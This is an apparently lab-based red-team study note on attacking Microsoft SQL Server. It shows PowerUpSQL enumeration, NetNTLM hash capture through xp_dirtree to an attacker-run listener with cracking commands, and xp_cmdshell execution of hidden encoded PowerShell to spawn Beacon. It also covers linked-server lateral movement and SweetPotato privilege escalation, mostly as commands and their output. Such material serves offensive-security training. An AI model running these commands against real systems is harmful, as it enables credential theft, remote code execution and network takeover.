---
creation date: September 25th 2022
last modified date: September 25th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[MS SQL Server]]  
___

## Description:  
Microsoft SQL Server is a relational database management system commonly found in Windows environments. They’re typically used to store information to support a myriad of business functions. In addition to the obvious data theft opportunities, they also have a large attack surface, allowing code execution, privilege escalation, lateral movement and persistence.



### Enumeration

^896209

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is an excellent tool for enumerating and interacting with MS SQL Servers.

There are a few "discovery" cmdlets available for finding MS SQL Servers, including `Get-SQLInstanceDomain`, `Get-SQLInstanceBroadcast` and `Get-SQLInstanceScanUDP`.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-SQLInstanceDomain

ComputerName     : srv-1.dev.cyberbotic.io
Instance         : srv-1.dev.cyberbotic.io,1433
DomainAccountSid : 15000005210002361191261941702819312113313089172110400
DomainAccount    : svc_mssql
DomainAccountCn  : MS SQL Service
Service          : MSSQLSvc
Spn              : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
LastLogon        : 5/14/2021 2:24 PM
Description      :
```

BloodHound also has an edge for finding potential MS SQL Admins, based on the assumption that the account running the SQL Service is also a sysadmin (which is very common);
```
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

You may also search the domain for groups that sound like they may have access to database instances (for instance, there is a **MS SQL Admins** group).

Once you've gained access to a target user, `Get-SQLConnectionTest` can be used to test whether or not we can connect to the database.

```
beacon> powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl

ComputerName : srv-1.dev.cyberbotic.io
Instance     : srv-1.dev.cyberbotic.io,1433
Status       : Accessible
```

Then use `Get-SQLServerInfo` to gather more information about the instance.
```
beacon> powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"

ComputerName           : srv-1.dev.cyberbotic.io
Instance               : SRV-1
DomainName             : DEV
ServiceProcessID       : 3960
ServiceName            : MSSQLSERVER
ServiceAccount         : DEV\svc_mssql
AuthenticationMode     : Windows Authentication
```

For multiple servers
```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

There are several options for issuing queries against a SQL instance.

`Get-SQLQuery` from PowerUpSQL:
```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"

Column1
-------
SRV-1
```

`mssqlclient.py` from Impacket via proxychains:

```
root@kali:~# proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.25:1433-<><>-OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SRV-1): Line 1: Changed database context to 'master'.
[*] INFO(SRV-1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162)
[<>] Press help for extra shell commands
SQL> select @@servername;

SRV-1
```
Or a Windows SQL GUI (such as [HeidiSQL](https://www.heidisql.com/) or even [SMSS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms)) via Proxifier:


### NetNTLM Capture

^06fa80

The **xp_dirtree** procedure can be used to capture the NetNTLM hash of the principal being used to run the MS SQL Service. We can use [InveighZero](https://github.com/Kevin-Robertson/InveighZero) to listen to the incoming requests (this should be run as a local admin).

```
beacon> execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N

[*] Inveigh 0.913 started at 2021-03-10T18:02:36
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 10.10.17.231
[+] Spoofer IP Address = 10.10.17.231
```

Now execute `EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1` on the MS SQL server, where `10.10.17.231` is the IP address of the machine running InveighZero.

```
[+] [2021-05-14T15:33:49] TCP(445) SYN packet from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLMv2 captured for DEV\svc_mssql from 10.10.17.25(SRV-1):50323:
svc_mssql::DEV:[...snip...]
```

Use `--format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2` with **john** or `-a 0 -m 5600 svc_mssql-netntlmv2 wordlist` with **hashcat** to crack.

You may also use the WinDivert + rportfwd combo with Impacket's [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) to capture the NetNTLM hashes.

```
root@kali:~# python3 /usr/local/bin/smbserver.py -smb2support pwn .
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (127.0.0.1,46894)
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] AUTHENTICATE_MESSAGE (DEV\svc_mssql,SRV-1)
[*] User SRV-1\svc_mssql authenticated successfully
[*] svc_mssql::DEV:[...snip...]
[*] Connecting Share(1:pwn)
```


### Command Execution

^a8479b

The **xp_cmdshell** procedure can be used to execute shell commands on the SQL server.  `Invoke-SQLOSCmd` from PowerUpSQL provides a simple means of using it.
```
beacon> powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

dev\svc_mssql
```

To execute manually (in Heidi/mssqlclient.py), try:
```
EXEC xp_cmdshell 'whoami';
```

If you get an error, try enabling xp_cmdshell (disable it by changing xp_cmdshell value to 0)
```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

With command shell execution, spawning a Beacon can be as easy as a PowerShell one-liner.
```
EXEC xp_cmdshell 'powershell -w hidden -enc <blah>';
```

There is a SQL command length limit that will prevent you from sending large payloads directly in the query, and the SQL servers cannot reach your Kali IP directly. Reverse Port Forwards and Pivot Listeners are your friends.

### Lateral Movement

^db515f

SQL Servers have a concept called "Linked Servers", which allows a database instance to access data from an external source. MS SQL supports multiple sources, including other MS SQL Servers. These can also be practically anywhere - including other domains, forests or in the cloud.

We can discover any links that the current instance has:

```
SELECT * FROM master..sysservers;
```

We can query this remote instance over the link using **OpenQuery**:

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

That includes being able to query its configuration (e.g. xp_cmdshell).

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

If xp_cmdshell is disabled, you can't enable it by executing `sp_configure` via OpenQuery. If **RPC Out** is enabled on the link (which is not the default configuration), then you can enable xpcmdshell using the following syntax:

```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]
```

Manually querying databases to find links can be cumbersome and time-consuming, so you can also use `Get-SQLServerLinkCrawl` to automatically crawl all available links.

```
beacon> powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"

Version     : SQL Server 2016 
Instance    : SRV-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1}
User        : DEV\bfarmer
Links       : {SQL-1.CYBERBOTIC.IO}

Version     : SQL Server 2016 
Instance    : SQL-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO}
User        : sa
Links       : {SQL01.ZEROPOINTSECURITY.LOCAL}

Version     : SQL Server 2019 
Instance    : SQL01\SQLEXPRESS
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO, SQL01.ZEROPOINTSECURITY.LOCAL}
User        : sa
Links       :
```

This output shows a chain from `SRV-1 > SQL-1.CYBERBOTIC.IO > SQL01.ZEROPOINTSECURITY.LOCAL`, the links are configured with local `sa` accounts, and we have sysadmin privileges on each instance.

To execute a shell command on `sql-1.cyberbotic.io`:
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
```
And to execute a shell command on `sql01.zeropointsecurity.local`, we have to embed multiple OpenQuery statements.
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```


### Privilege Escalation

^33c580

This instance of SQL is running as `NT Service\MSSQL$SQLEXPRESS`, which is generally configured by default on more modern SQL installers. It has a special type of privilege called `SeImpersonatePrivilege`. This allows the account to "impersonate a client after authentication".

```
beacon> getuid
[*] You are NT Service\MSSQL$SQLEXPRESS

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges

====== TokenPrivileges ======

Current Token's Privileges

                SeAssignPrimaryTokenPrivilege:  DISABLED
                     SeIncreaseQuotaPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED
                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED

[*] Completed collection in 0.01 seconds
```

[SweetPotato](https://github.com/CCob/SweetPotato) has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command.  SweetPotato needs to be compiled in Release mode, to ensure the [NtApiDotNet](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/main/NtApiDotNet) assembly is merged.
```
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAF[...snip...]ApAA=="

SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
[+] Attempting NP impersonation using method PrintSpoofer to launch C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[+] Triggering notification on evil PIPE \\sql01/pipe/7365ffd9-7808-4a0d-ab47-45850a41d7ed
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

beacon> connect localhost 4444
[*] Tasked to connect to localhost:4444
[+] host called home, sent: 20 bytes
[+] established link to child beacon: 10.10.18.221
```
 

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 25th 2022 (07:31 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
